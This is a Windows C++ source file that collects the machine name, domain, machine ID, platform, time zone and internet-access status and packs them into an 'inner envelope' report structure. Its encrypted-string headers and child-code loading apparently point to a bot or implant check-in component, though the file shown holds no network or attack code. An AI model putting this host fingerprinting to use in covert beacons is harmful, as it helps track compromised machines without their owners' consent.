/*
	CommStructures.cpp
	Misc routines used with common structures
*/

#include <Windows.h>
#include "CommStructures.h"


#ifdef ROUTINES_BY_PTR


CommStructures_ptrs CommStructures_apis;	// global var for transparent name translation into call-by-pointer	


// should be called before any other apis used to fill internal structures
VOID CommStructures_resolve(CommStructures_ptrs *apis)
{
	// save to a global var
	CommStructures_apis = *apis;
}

#else 

#include <lm.h>

#pragma comment(lib, "netapi32.lib")

#include "..\inc\mem.h"
#include "..\inc\dbg.h"
#include "..\inc\CryptoStrings.h"
#include "..\inc\HashedStrings.h"
#include "..\inc\machineid.h"
#include "..\inc\WOW64Detect.h"

#include "..\shared\config.h"


COMMSTRUCT_CONTEXT g_csContext;	// global var with module's context

/*
	Fill passed structure with ptrs to all exported functions
	Used when module compiled as code to provide ptrs to some other child code
*/
VOID CommStructures_imports(CommStructures_ptrs *apis)
{
	apis->fncmsFillInnerEnvelope = cmsFillInnerEnvelope;
	apis->fncmsAllocInitInnerEnvelope = cmsAllocInitInnerEnvelope;
	apis->fncmsReportInternetAccessStatus = cmsReportInternetAccessStatus;
}


VOID _cmsCheckInitGlobals()
{
	WKSTA_INFO_100 *wkInfo = NULL;	// for NetWkstaGetInfo()

	// check for already inited
	if (g_csContext.bInited) { return; }

	DbgPrint("initializing context");

	// wipe
	memset(&g_csContext, 0, sizeof(COMMSTRUCT_CONTEXT));

	// query domain and machine name
	if (NERR_Success != NetWkstaGetInfo(NULL, 100, (LPBYTE *)&wkInfo)) { DbgPrint("ERR: NetWkstaGetInfo() failed, le %04Xh", GetLastError()); }
	else {

		// copy names
		DbgPrint("compname=[%ws] domain=[%ws]", wkInfo->wki100_computername, wkInfo->wki100_langroup);
		lstrcpyW(g_csContext.wcMachine, wkInfo->wki100_computername);
		lstrcpyW(g_csContext.wcDomain, wkInfo->wki100_langroup);

		// free buffer
		if (wkInfo) { NetApiBufferFree(wkInfo); }

	}

	// compatible machine-id
	g_csContext.i64SourceMachineId = i64MakeMachineID();	

#if !defined(_M_X64)
	// check WOW3264 for x32 platform
	g_csContext.bWOW3264Detected = IsX64Windows();
#endif

	// all ok if got here
	g_csContext.bInited = TRUE;
}

/*
	Used to save state of internet access after transport init was performed
*/
VOID cmsReportInternetAccessStatus(BOOL bAccessAvailable)
{
	DbgPrint("bAccessAvailable=%u", bAccessAvailable);

	g_csContext.bTransportInited = TRUE;
	g_csContext.bMachineHasInternetAccess = bAccessAvailable;
}


/*
	Fills entries of passed inner envelope structure
	EXCEPT wEnvelopeId, dwDataLen, which to be filled by caller
*/
VOID cmsFillInnerEnvelope(INNER_ENVELOPE *iEnvelope)
{
	SYSTEMTIME st = { 0 };
	TIME_ZONE_INFORMATION tz = { 0 };

	// check/init globals
	_cmsCheckInitGlobals();

	GetLocalTime(&st);              // Gets the current system time

	// fill fields
	iEnvelope->dwTickCountStamp = GetTickCount();

	// for x64 target only, set platform x64 flag
#if defined(_M_X64)
	iEnvelope->bContextFlags |= (1 << ICF_BUILD_X64);
	iEnvelope->bContextFlags |= (1 << ICF_PLATFORM_X64);
#else
	// check platform for x64 support in case of x32 code, to detect installer platform mismatch
	if (g_csContext.bWOW3264Detected) { iEnvelope->bContextFlags |= (1 << ICF_PLATFORM_X64); }
#endif

	// set other bitfields
	if (g_csContext.bTransportInited) { iEnvelope->bContextFlags |= (1 << ICF_TRANSPORT_INIT_FINISHED); }
	if (g_csContext.bMachineHasInternetAccess) { iEnvelope->bContextFlags |= (1 << ICF_MACHINE_HAS_INTERNET_ACCESS); }

	// build id
	iEnvelope->wBuildId = BUILD_ID;

	// stamp values
	iEnvelope->wYear = st.wYear;
	iEnvelope->bMonth = (BYTE)st.wMonth;
	iEnvelope->bDay = (BYTE)st.wDay;
	iEnvelope->bHour = (BYTE)st.wHour;
	iEnvelope->bMinute = (BYTE)st.wMinute;
	iEnvelope->bSecond = (BYTE)st.wSecond;

	// timezone params
	GetTimeZoneInformation(&tz);
	//memcpy(&iEnvelope->wTZName, &tz.StandardName, 32 * 2);
	// translate ansi unicode into utf-8
	WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)&tz.StandardName, -1, (LPSTR)&iEnvelope->wTZName, 32*2, NULL, NULL );
	iEnvelope->lBias = -tz.Bias;

	iEnvelope->i64SourceMachineId = g_csContext.i64SourceMachineId;
	memcpy(&iEnvelope->wcDomain, &g_csContext.wcDomain, 16 * 2);
	memcpy(&iEnvelope->wcMachine, &g_csContext.wcMachine, 16 * 2);

}

// allocates, adds and inits INNER_ENVELOPE structure with params passed
// returns NULL on any error
INNER_ENVELOPE *cmsAllocInitInnerEnvelope(LPVOID pExtraData, DWORD dwExtraDataLen, EnvelopeId eiEnvelopeId)
{
	INNER_ENVELOPE *iRes = NULL;	// function result

	if (!(iRes = (INNER_ENVELOPE *)my_alloc(sizeof(INNER_ENVELOPE) + dwExtraDataLen))) { DbgPrint("ERR: failed to alloc resulting buff of %u len", (sizeof(INNER_ENVELOPE) + dwExtraDataLen)); return NULL; }

	// fill basic fields
	cmsFillInnerEnvelope(iRes);

	// fill specific 
	iRes->wEnvelopeId = (WORD)eiEnvelopeId;
	iRes->dwDataLen = dwExtraDataLen;

	// append data, if any
	if (dwExtraDataLen) {
		memcpy((LPVOID)((SIZE_T)iRes + sizeof(INNER_ENVELOPE)), pExtraData, dwExtraDataLen);
	}

	return iRes;	// return result
}

#endif